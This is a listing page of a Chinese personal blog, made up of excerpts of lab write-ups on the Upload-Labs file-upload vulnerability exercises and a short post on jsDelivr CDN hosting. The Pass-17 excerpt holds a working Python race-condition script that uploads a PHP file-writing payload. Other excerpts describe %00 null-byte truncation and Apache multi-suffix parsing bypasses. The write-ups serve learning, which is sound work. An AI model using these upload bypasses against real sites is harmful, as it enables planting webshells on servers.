<!doctype html><html lang=en dir=auto><head><meta name=generator content="Hugo 0.145.0"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Braindance's Blog</title>
<meta name=keywords content="Blog,Hugo"><meta name=description content="为世界上所有的美好而战"><meta name=author content="Braindance"><link rel=canonical href=http://localhost:1313/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.9de45e225101e4f99701d2b68fc6b8a1ef6027928be6391fa15bf7f56326c909.css integrity="sha256-neReIlEB5PmXAdK2j8a4oe9gJ5KL5jkfoVv39WMmyQk=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=http://localhost:1313/index.xml><link rel=alternate hreflang=en href=http://localhost:1313/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="http://localhost:1313/"><meta property="og:site_name" content="Braindance's Blog"><meta property="og:title" content="Braindance's Blog"><meta property="og:description" content="为世界上所有的美好而战"><meta property="og:locale" content="en"><meta property="og:type" content="website"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Braindance's Blog"><meta name=twitter:description content="为世界上所有的美好而战"><script type=application/ld+json>{"@context":"https://schema.org","@type":"Organization","name":"Braindance's Blog","url":"http://localhost:1313/","description":"为世界上所有的美好而战","logo":"http://localhost:1313/%3Clink%20/%20abs%20url%3E","sameAs":["https://github.com/penginman"]}</script></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/tags/ title=标签><span>标签</span></a></li><li><a href=https://www.travellings.cn/go.html title=开往><span>开往</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Upload-Labs的最后几道题</h2></header><div class=entry-content><p>Pass-17 ​ （windows环境，php版本5.2.17，题号是18题）
源码：
$is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,".")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = "只允许上传.jpg|.png|.gif类型文件！"; unlink($upload_file); } }else{ $msg = '上传出错！'; } } ​ 思路和前面的一样，获取文件信息，移动文件到upload文件夹，第12行使用了白名单验证，多了第14行的rename函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了上传竞争，使用python脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码&lt;?php fputs(fopen('shell.php','w'),'&lt;?php phpinfo();?>');?>这段代码执行以后，会创建一个名为shell.php里面有一句&lt;?php phpinfo();?>的文件。
​ 脚本代码
#coding=utf-8 import requests from multiprocessing import Pool def CompeteUpload(list): url="http://upload-labs/Pass-18/index.php" #上传页面 geturl="http://upload-labs/upload/233.php" #访问上传文件 file={'upload_file':('233.php',"&lt;?php fputs(fopen('shell.php','w'),'&lt;?php phpinfo();?>');?>",'image/jpeg')} data={'submit':'上传'} r=requests.post(url=url,data=data,files=file) #print "test upload...." r1=requests.get(url=geturl) if r1.status_code==200: print ("upload success!") if __name__=="__main__": pool = Pool(10) pool.map(CompeteUpload, range(10000)) pool.close() pool.join() ​ 第一次用python的我在这里知道了pip。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工
Pass-18（失手） ​ 18题失手了没有思路，如果使用include.php文件包含的话还可以，看了看网上大部分的博客都是敷敷衍衍过去的，找到了一篇稍微有点思路的，使用的是apache2.2.x的解析漏洞，这个漏洞的思路就是，apache服务器在解析有多个后缀名的文件时，从最后一个开始向前扫描，如果不认识就跳过，直到遇到一个认识的文件后缀，就把这个文件以这个能识别的后缀解析。
Apache文件解析漏洞
apache httpd多后缀解析漏洞复现
​ 源码中还有一个可以突破的点是同样使用了重命名函数，所以应该还是可以使用竞争上传访问得到，但是使用了白名单验证，我实在是没招了所以先摸为敬。
Pass-19 （windows环境，php5.2.17，magic_quotes_gpc=Off）
...</p></div><footer class=entry-footer><span title='2020-11-19 08:47:19 +0000 UTC'>November 19, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;283 words&nbsp;·&nbsp;Braindance</footer><a class=entry-link aria-label="post link to Upload-Labs的最后几道题" href=http://localhost:1313/posts/ctf/upload-labs5/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Upload-Labs之Pass-16</h2></header><div class=entry-content><p>前言 ​ 我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。
​ 参考博客：upload-labs之pass 16详细分析
Pass-16 ​ 源码（三种图片的判定，只贴一个吧，篇幅小一点）：
$is_upload = false; $msg = null; if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,"."),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == "jpg") && ($filetype=="image/jpeg")){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = "该文件不是jpg格式的图片！"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".jpg"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = "上传出错！"; } }else if(($fileext == "png") && ($filetype=="image/png")){ ...... }else if(($fileext == "gif") && ($filetype=="image/gif")){ ..... }else{ $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！"; } } ​ 提示：本pass重新渲染了图片！。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。
​ 首先是分析一波源码：
​ 以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行move_uploaded_file函数先把文件移动到upload文件夹，现在文件路径是$target_path，之后对图片进行二次渲染。
​ 二次渲染用到了imagecreatefromjpeg函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行unlink函数删除文件，否则，为新图片随机一个名称，执行imagejpeg函数把图象输出到新文件 $newfilename。再将之前用户上传的文件$target_path删除掉。
​ 根据上面的分析就能得出来两种思路：
访问二次渲染之前的上传的文件。 在图片二次渲染以后图片马未失效。 第一种方法 ​ （Linux环境、php版本7.2.21）
...</p></div><footer class=entry-footer><span title='2020-11-16 22:50:25 +0000 UTC'>November 16, 2020</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;843 words&nbsp;·&nbsp;Braindance</footer><a class=entry-link aria-label="post link to Upload-Labs之Pass-16" href=http://localhost:1313/posts/ctf/upload-labs4/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Upload-Labs(三)</h2></header><div class=entry-content><p>前言 ​ 继续接着上一次的Upload-labs往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。
​ 在线靶机地址：
linux环境 windows环境 Pass-11 ​ (这题使用了windows环境)
​ 源码：
$is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = "只允许上传.jpg|.png|.gif类型文件！"; } } ​ 分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了$_GET['save_path']，本题提示也写道
本pass上传路径可控！，就是通过这个GET变量控制上传路径。
​ 这一关的突破方法需要有一些条件：php版本需要低于5.3.29（我使用的是php版本5.3.17的本地靶机），另一个条件是magic_quotes_gpc需要为关闭状态。magic_quotes_gpc的作用官方文档写道：
Warning 本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。
​ 为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 ’ (单引号)、" (双引号)、\（反斜杠）和 NUL’s 被一个反斜杠自动转义。
​ 使用bp抓包并添加0x00截断，在GET请求中可以使用url编码的截断：%00。贴个自己参考的博客，截断上传原理剖析。个人对于这道题的分析就是，上面文件的代码执行到第8行的时候，获取到了$_GET['save_path']变量的值，但是我们在这个变量后面添加了0x00截断，所以后面的代码便不会执行，文件也就不会被重命名。
​ 文件成功上传，然后访问的时候记得改一下路径，因为文件名已经截断，所以访问路径由..../upload/233.php�/5120201115205501.jpg变为..../upload/233.php。完工
Pass-12 ​ （windows环境）
​ 这题和上一题差不多一样，就是把$_GET['save_path']变成了$_POST['save_path']。由GET请求改成了POST请求，但是抓包修改的地方就不一样了，需要通过16进制修改
...</p></div><footer class=entry-footer><span title='2020-11-16 16:04:30 +0000 UTC'>November 16, 2020</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;149 words&nbsp;·&nbsp;Braindance</footer><a class=entry-link aria-label="post link to Upload-Labs(三)" href=http://localhost:1313/posts/ctf/upload-labs3/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>jsDelivr加速静态博客</h2></header><div class=entry-content><p>前言 ​ 这几天总感觉博客访问特别慢，最先是找到了CDN加速，但是在国内加速的话域名都是要备案的，又看了看境外加速。
CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科
在犹豫要不要买的时候，发现了这个东西：jsdelivr，一个可以加速静态资源的免费CDN，官网上能看的出和WordPress有什么py关系还可以加速github的资源。hexo是静态博客，那么我就把博客要用到的js、css、还有博客用到的一些图片都放github然后引用。开搞
1. 新建仓库 ​ 名字重了是因为我已经创建好了并且使用了以后才来写的博客。
2. 克隆Git仓库到本地 ​ 在自己电脑建个文件夹然后打开git输入git clone 你仓库的链接，把刚刚创建的仓库拉倒本地方便上传到仓库。
廖雪峰老师的git教程我当时看了一遍，觉得非常棒，哈哈哈就是自己太菜了又给忘了，帖出来：Git简介。
3. 上传需要加速的资源 ​ 把需要上传的资源整理到刚刚拉下来的本地git仓库，上传。
git status //查看状态
git add . //添加所有文件到暂存区
git commit -m '第一次提交' //把文件提交到仓库
git push //推送至远程仓库 ​ 这里我说一下是怎么加速自己的博客的，因为博客加载的时候需要加载主题的各种js和css文件，然后因为服务器网渣所以加载时间很慢，使用加速的话就会加载的快。
​ 接下来是要上传哪些文件，我使用的是butterfly这个主题，主题github支持一下作者，直接在主题theme/butterfly文件夹下面找到资源文件夹source发现里面都是一些零碎的文件，但是在发布文件夹public下是一个完整的js和css，所以猜测生成的时候会把零碎的文件进行整合，然后主题配置文件里作者也写的很清楚
穷人流下了不争气的泪。传！(真加速还得选好服务器)
​ 这里我的分析是：由于引用的不是本地的资源文件，所以可能会产生自己在本地修改了某项配置，但是网页没有生效，这里就需要时刻记着自己引用的是github上的资源，如果本地配置大改的话，github上的文件也要进行重新上传覆盖。
​ 做法：配置文件里找到引用的是本地资源的项，然后在生成网站的public文件下找到对应的资源文件。
我列一下我在配置文件里修改的项：main_css、main、utils、local_search、algolia_js、translate，因为使用的是Valine评论，里面可以设置自定义表情，我也使用这个方法修改了。
3. 获取地址 ​ 官网首页很清楚的写明了如何获取资源链接
​ https://cdn.jsdelivr.net/gh/user/repo@version/file，user就是你的github用户名，repo@version，仓库加上版本号，file就是仓库下的路径。
​ 这里我没有说版本号是因为网上的教程讲到了仓库需要发布，但是我后面无意间发现不用发布直接reop@分支名，也可以访问到。并且我一开始也发布仓库了，但是后面想要修改已经上传的文件也出了一些问题，索性直接用简单的。
​ 贴一个我博客首页的壁纸链接：https://cdn.jsdelivr.net/gh/penginman/PicBed@master/top_img/83531406_p0.png
​ 这个壁纸有12M大小，而且链接也符合上面的格式，可以参考一下。
4. 引用链接 ​ 配置文件里可以找需要替换的资源，直接贴上链接就可以了，只不过以后别忘了你现在引用的是之前的上传的静态资源，别忘啦！别忘啦！别忘啦！
​ 我发现github能这样用以后就在上面整了图床，现在博客里的图片都开始在上传，之前用的路过图床，说的全球都有CDN加速，但是还是卡的一。
​ 还有我整理的Valine评论的自定义表情，大伙可以直接拿去用：图片地址，emojimap。完工
...</p></div><footer class=entry-footer><span title='2020-11-11 21:37:53 +0000 UTC'>November 11, 2020</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;67 words&nbsp;·&nbsp;Braindance</footer><a class=entry-link aria-label="post link to jsDelivr加速静态博客" href=http://localhost:1313/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Upload-Labs(二)</h2></header><div class=entry-content><p>前言 ​ 这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
if (file_exists(UPLOAD_PATH)) {
//这里下面是过滤
$deny_ext = array(".php",".php5",".php4",".html", ......);
$file_name = trim($_FILES['upload_file']['name']);
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, '.');
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空
//这里下面是移动文件。
if (!in_array($file_ext, $deny_ext)) {
$temp_file = $_FILES['upload_file']['tmp_name'];
$img_path = UPLOAD_PATH.'/'.$file_name;
if (move_uploaded_file($temp_file, $img_path)) {
$is_upload = true;
} else {
$msg = '上传出错！';
}
} else {
$msg = '此文件类型不允许上传！';
}
} else {
$msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
}
} 过滤部分：
...</p></div><footer class=entry-footer><span title='2020-11-09 20:12:27 +0000 UTC'>November 9, 2020</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;542 words&nbsp;·&nbsp;Braindance</footer><a class=entry-link aria-label="post link to Upload-Labs(二)" href=http://localhost:1313/posts/ctf/upload-labs2/></a></article><footer class=page-footer><nav class=pagination><a class=prev href=http://localhost:1313/page/6/>«&nbsp;Prev&nbsp;
</a><a class=next href=http://localhost:1313/page/8/>Next&nbsp;&nbsp;»</a></nav></footer></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Braindance's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>